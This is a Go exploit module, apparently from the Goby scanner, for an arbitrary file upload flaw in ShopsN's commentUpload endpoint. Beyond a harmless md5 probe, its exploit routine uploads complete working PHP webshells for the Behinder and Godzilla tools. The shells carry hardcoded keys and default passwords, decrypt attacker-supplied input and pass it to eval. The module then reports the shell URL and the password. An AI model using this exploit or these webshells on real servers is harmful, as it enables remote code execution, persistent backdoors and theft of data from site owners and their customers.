package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ShopsN commentUpload Path File Upload Vulnerability",
    "Description": "<p>ShopsN is an open-source online store full-network system that complies with enterprise-level commercial standards and is fully functional and truly allows free commercial use.</p><p>There is an arbitrary file upload vulnerability in ShopsN commentUpload, attackers can upload malicious Trojan horses to gain server privileges.</p>",
    "Product": "ShopsN",
    "Homepage": "http://www.shopsn.net/",
    "DisclosureDate": "2023-03-10",
    "Author": "h1ei1",
    "FofaQuery": "title=\"上海盈赛电子商务有限公司\" || body=\"/Supermarket/ProductList\" || body=\"/Uploads/conf/supermarket\" || body=\"/Uploads/intnet/\"",
    "GobyQuery": "title=\"上海盈赛电子商务有限公司\" || body=\"/Supermarket/ProductList\" || body=\"/Uploads/conf/supermarket\" || body=\"/Uploads/intnet/\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file upload vulnerability in ShopsN commentUpload, attackers can upload malicious Trojan horses to gain server privileges.</p><p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.shopsn.net/\">http://www.shopsn.net/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://chybeta.github.io/2018/03/21/%E6%9F%90%E5%95%86%E5%9F%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "testadasd.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "input the content",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "ShopsN commentUpload 路径文件上传漏洞",
            "Product": "ShopsN",
            "Description": "<p>ShopsN 是一款符合企业级商用标准全功能的真正允许免费商业用途的开源网店全网系统。<br></p><p>攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.shopsn.net/\">http://www.shopsn.net/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>ShopsN commentUpload 存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "ShopsN commentUpload Path File Upload Vulnerability",
            "Product": "ShopsN",
            "Description": "<p>ShopsN is an open-source online store full-network system that complies with enterprise-level commercial standards and is fully functional and truly allows free commercial use.<br></p><p>There is an arbitrary file upload vulnerability in ShopsN commentUpload, attackers can upload malicious Trojan horses to gain server privileges.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"http://www.shopsn.net/\">http://www.shopsn.net/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in ShopsN commentUpload, attackers can upload malicious Trojan horses to gain server privileges.<br></p><p>Attackers can use file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10839"
}`

	uploadFilesByMultipart782456djtyx := func(hostInfo *httpclient.FixUrl, fileName, content string) (string, bool) {
		sendConfig := httpclient.NewPostRequestConfig("/index.php/Home/AppUpload/commentUpload")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryqfmeYTXFKSA3F97e")
		sendConfig.Data = "------WebKitFormBoundaryqfmeYTXFKSA3F97e\r\nContent-Disposition: form-data; name=\"img\"; filename=\"" + fileName + "\"\r\nContent-Type: text/php\r\n\r\n" + content + "\r\n------WebKitFormBoundaryqfmeYTXFKSA3F97e\nContent-Disposition: form-data; name=\"submit\"\n\nSubmit\n------WebKitFormBoundaryqfmeYTXFKSA3F97e--\n"
		_, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		if err != nil {
			return fileName, false
		}
		return fileName, true
	}

	checkFileExists54527932dsf := func(hostInfo *httpclient.FixUrl, fileName string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/Uploads/show/" + fileName + ".php")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			fileName := goutils.RandomHexString(8) + ".php"
			createdFileName, uploadSuccess := uploadFilesByMultipart782456djtyx(hostInfo, fileName, "<?php echo md5(233);unlink(__FILE__);?>")
			if !uploadSuccess {
				return false
			}
			resp, err := checkFileExists54527932dsf(hostInfo, createdFileName)
			return err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e165421110ba03099a1c0393373c5b43")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			webshell := goutils.B2S(singleScanConfig.Params["webshell"])
			fileName := goutils.B2S(singleScanConfig.Params["filename"])
			content := goutils.B2S(singleScanConfig.Params["content"])
			if attackType == "webshell" {
				fileName = goutils.RandomHexString(8) + ".php"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码 rebeyond */
					content = `<?php @error_reporting(0); session_start();     $key="e45e329feb5d925b"; $_SESSION['k']=$key;   session_write_close();   $post=file_get_contents("php://input");   if(!extension_loaded('openssl'))   {     $t="base64_"."decode";     $post=$t($post."");          for($i=0;$i<strlen($post);$i++) {            $post[$i] = $post[$i]^$key[$i+1&15];            }   }   else   {     $post=openssl_decrypt($post, "AES128", $key);   }     $arr=explode('|',$post);     $func=$arr[0];     $params=$arr[1];   class C{public function __invoke($p) {eval($p."");}}     @call_user_func(new C(),$params);     echo "e165421110ba03099a1c0393373c5b43"; ?> `
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}echo "e165421110ba03099a1c0393373c5b43";?>`
				}
			}
			createdFileName, uploadSuccess := uploadFilesByMultipart782456djtyx(expResult.HostInfo, fileName, content)
			if !uploadSuccess {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			resp, err := checkFileExists54527932dsf(expResult.HostInfo, createdFileName)
			if !(err == nil && resp.StatusCode == 200) {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output = "File URL: " + expResult.HostInfo.FixedHostInfo + "/Uploads/show/" + createdFileName + "\n"
				return expResult
			}
			expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/Uploads/show/" + createdFileName + "\n"
			if webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: php"
			return expResult
		},
	))
}
